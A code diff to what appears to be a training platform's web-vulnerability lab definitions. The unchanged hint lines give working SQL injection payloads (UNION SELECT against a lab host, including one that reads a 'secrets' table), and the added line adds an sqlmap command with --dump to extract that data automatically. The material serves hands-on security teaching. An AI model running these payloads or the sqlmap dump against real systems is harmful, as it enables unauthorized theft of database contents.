@@ -30,6 +30,7 @@ export const webVulnLabs: LabScenario[] = [
       'curl "http://10.10.103.1/product?id=1" for a clean baseline.',
       'curl "http://10.10.103.1/product?id=-1 UNION SELECT 1,2,3--" — id=-1 blanks the original result so only injected columns would show; 3 is the right column count here.',
       'curl "http://10.10.103.1/product?id=-1 UNION SELECT 1,2,3 FROM secrets--" — same column count, but sourced from the internal secrets table.',
+      'Prefer automation? sqlmap -u "http://10.10.103.1/product?id=1" --batch confirms the injectable parameter, then re-run with --dump once you\'ve found the payload above to pull the same data sqlmap-style.',
     ],
     totalFlags: 1,
     attacker: attacker(),
